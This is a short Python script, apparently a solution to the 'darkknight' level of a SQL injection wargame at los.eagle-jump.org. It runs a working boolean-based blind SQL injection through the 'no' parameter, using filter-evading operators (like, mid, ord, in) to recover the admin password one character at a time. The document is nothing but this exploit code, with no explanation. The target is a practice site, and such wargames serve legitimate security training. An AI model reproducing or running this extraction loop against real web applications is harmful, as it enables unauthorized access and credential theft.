import requests
import string

url = 'https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php'

mycookie = {
    'PHPSESSID': ''
}

letters = string.digits + string.ascii_letters
print(letters)
ans = ""

response = requests.get(url + '?pw=1&no=1 || id in ("admin") '+ "%26" + "%26" +  " ord(mid(pw, 1, 1)) like " + str(ord(str(1))) + "%23", cookies=mycookie)
print(len(response.text))
if 'Hello admin' in response.text:
    print(response.text)


for i in range(1, 9):
    for char in letters:
        #print(type(char))
        char = ord(char)
        response = requests.get(url + '?pw=1&no=1 || id in ("admin") ' + "%26" + "%26" + " ord(mid(pw, {index}, 1)) like {char} %23".format(index = i, char = char), cookies=mycookie)        
        #print(len(response.text))
        if 'Hello admin' in response.text:
            ans += chr(char)
            #print(char)
            break
print(ans)


